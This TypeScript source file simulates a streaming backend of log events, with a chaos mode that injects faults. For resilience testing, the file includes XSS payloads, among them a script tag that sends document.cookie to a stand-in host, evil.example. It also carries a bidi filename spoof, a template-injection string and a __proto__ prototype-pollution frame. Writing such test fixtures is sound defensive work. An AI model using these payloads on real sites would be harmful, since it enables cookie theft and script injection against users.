import { Observable, type ReadonlyObservable } from '../../application/Observable'
import type { StreamTransport, TransportConnection, TransportHandlers } from '../../application/ports'

export interface SimulatorSettings {
  /** Average events per second. */
  readonly rate: number
  /**
   * Fault injection: malformed and hostile frames, connect failures,
   * random disconnects, stalls and bursts. Exercises every resilience path.
   */
  readonly chaos: boolean
}

export interface SimulatorControls {
  readonly settings: ReadonlyObservable<SimulatorSettings>
  update(patch: Partial<SimulatorSettings>): void
}

const TICK_MS = 50
const MAX_RATE = 20_000

const SERVICES = ['api-gateway', 'auth', 'payments', 'search', 'inventory', 'notifications', 'checkout', 'billing']
const MESSAGES: Record<string, readonly string[]> = {
  info: ['Request completed', 'Cache warmed', 'Health check passed', 'Job scheduled', 'Token refreshed', 'Config reloaded'],
  warning: ['Slow upstream response', 'Retrying request', 'Queue depth rising', 'Rate limit at 80%', 'Deprecated endpoint called'],
  error: ['Upstream returned 502', 'Database timeout', 'Payment provider rejected request', 'Validation failed for order'],
  critical: ['Circuit breaker open', 'Disk usage above 95%', 'Primary database unreachable', 'Error budget exhausted'],
}

/** Hostile-but-well-formed payloads. Rendering must show these as inert text. */
const HOSTILE_MESSAGES = [
  '<img src=x onerror=alert("xss")>',
  '<script>document.location="https://evil.example/?c="+document.cookie</script>',
  'javascript:alert(1)',
  'Invoice \u202Etxt.exe\u202C ready', // bidi override spoofing
  '{{constructor.constructor("alert(1)")()}}',
]

/** Frames that must be rejected by validation. */
const MALFORMED_FRAMES: readonly (() => unknown)[] = [
  () => '{"id": "evt_trunc", "severity": ', // truncated JSON
  () => JSON.stringify({ id: 'x', service: 'auth', severity: 'debug', latencyMs: 3, message: 'bad severity' }),
  () => JSON.stringify({ id: 'x', service: 'auth', severity: 'info', latencyMs: 'fast', message: 'bad type' }),
  () => JSON.stringify({ id: 'x', service: '<b>auth</b>', severity: 'info', latencyMs: 1, message: 'bad service' }),
  () => '{"__proto__":{"polluted":true},"id":"p","service":"auth","severity":"info","latencyMs":1}',
  () => JSON.stringify([1, 2, 3]),
  () => 'x'.repeat(64 * 1024), // oversized
  () => 42, // non-text frame
]

const pick = <T>(items: readonly T[]): T => items[Math.floor(Math.random() * items.length)]

function pickSeverity(): string {
  const r = Math.random()
  if (r < 0.75) return 'info'
  if (r < 0.9) return 'warning'
  if (r < 0.98) return 'error'
  return 'critical'
}

function latencyFor(severity: string, t: number): number {
  // A slow sine "daily cycle" plus noise, so the latency chart has shape.
  const baseline = 80 + 40 * Math.sin(t / 20_000)
  const factor = severity === 'info' ? 1 : severity === 'warning' ? 2.5 : 4
  return Math.max(1, baseline * factor * (0.6 + Math.random() * 0.8))
}

/**
 * In-process stand-in for a streaming backend. It emits *serialized* JSON
 * frames, so the data goes through the same validation path as a real socket.
 */
export class SimulatedTransport implements StreamTransport, SimulatorControls {
  readonly #settings: Observable<SimulatorSettings>
  #counter = 0

  constructor(initial: SimulatorSettings) {
    this.#settings = new Observable(initial)
  }

  get settings(): ReadonlyObservable<SimulatorSettings> {
    return this.#settings
  }

  update(patch: Partial<SimulatorSettings>): void {
    const next = { ...this.#settings.get(), ...patch }
    this.#settings.set({ ...next, rate: Math.min(MAX_RATE, Math.max(1, Math.round(next.rate))) })
  }

  open(handlers: TransportHandlers): TransportConnection {
    let closed = false
    let tick: ReturnType<typeof setInterval> | undefined
    const timers: ReturnType<typeof setTimeout>[] = []
    const chaos = () => this.#settings.get().chaos
    const later = (ms: number, fn: () => void) => timers.push(setTimeout(() => !closed && fn(), ms))

    const shutdown = () => {
      closed = true
      clearInterval(tick)
      timers.forEach(clearTimeout)
    }

    const handshakeMs = 250 + Math.random() * 500
    later(handshakeMs, () => {
      if (chaos() && Math.random() < 0.25) {
        shutdown()
        handlers.onClose('network') // connect failure, exercises backoff
        return
      }
      handlers.onOpen()

      let carry = 0
      let burstUntil = 0
      let stalled = false
      tick = setInterval(() => {
        if (stalled) return
        const now = Date.now()
        if (chaos() && now > burstUntil && Math.random() < 0.002) burstUntil = now + 2_000
        const multiplier = now < burstUntil ? 6 : 1
        carry += (this.#settings.get().rate * multiplier * TICK_MS) / 1000
        const n = Math.floor(carry)
        carry -= n
        for (let i = 0; i < n && !closed; i++) handlers.onMessage(this.#nextFrame(now))
      }, TICK_MS)

      if (chaos()) {
        // Random disconnect after 40–90 s, or occasionally a silent stall that only the watchdog can catch.
        const lifetime = 40_000 + Math.random() * 50_000
        if (Math.random() < 0.2) {
          later(lifetime, () => {
            stalled = true
          })
        } else {
          later(lifetime, () => {
            shutdown()
            handlers.onClose('network')
          })
        }
      }
    })

    return { close: shutdown }
  }

  #nextFrame(now: number): unknown {
    if (this.#settings.get().chaos) {
      const r = Math.random()
      if (r < 0.004) return pick(MALFORMED_FRAMES)()
      if (r < 0.007) return this.#frame(now, 'warning', pick(HOSTILE_MESSAGES))
    }
    const severity = pickSeverity()
    return this.#frame(now, severity, pick(MESSAGES[severity]))
  }

  #frame(now: number, severity: string, message: string): string {
    const id = `evt_${(++this.#counter).toString(36)}`
    return JSON.stringify({
      id,
      ts: now,
      service: pick(SERVICES),
      severity,
      latencyMs: Math.round(latencyFor(severity, now) * 10) / 10,
      message,
    })
  }
}
